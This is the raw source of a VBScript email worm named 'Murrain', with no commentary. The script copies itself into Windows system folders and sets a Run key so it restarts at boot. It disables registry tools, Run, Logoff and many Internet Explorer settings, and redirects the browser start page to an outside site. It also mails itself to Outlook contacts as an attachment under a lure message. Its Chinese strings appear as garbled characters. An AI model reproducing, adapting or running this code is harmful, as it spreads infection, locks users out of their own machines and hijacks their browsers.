On Error Resume Next
Set fs=CreateObject("Scripting.FileSystemObject")
Set dir1=fs.GetSpecialFolder(0)
Set dir2=fs.GetSpecialFolder(1)
Set so=CreateObject("Scripting.FileSystemObject")
dim r
Set r=CreateObject("Wscript.Shell")
so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Murrain.vbs")
so.GetFile(WScript.ScriptFullName).Copy(dir2&"\Murrain.vbs")
so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Start Menu\Programs\����\Murrain.vbs")
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry",""
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff",1,"REG_DWORD"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Murrain","Murrain.vbs"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled",1,"REG_DWORD"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption","̨�硰Murrain���Ѿ���½��ĵ���"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText","�������˺�֮����ʶ������Ĳ���"
Set ol=CreateObject("Outlook.Application")
On Error Resume Next
For x=1 To t
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="����������"
Mail.Body="������ã���������Rose������������������롣����������Ķ����Ÿ�����ף�����ˣ�            ͬ��Լ����"
Mail.Attachments.Add(dir2&"Murrain.vbs")
Mail.Send
Next
ol.Quit
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserSaveAs",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Advanced",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Cache Internet",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\AutoConfig",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\History",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",1,"REG_DWORD"
r.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.see1see.com/gho/4/womenghost.html"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource",1,"REG_DWORD"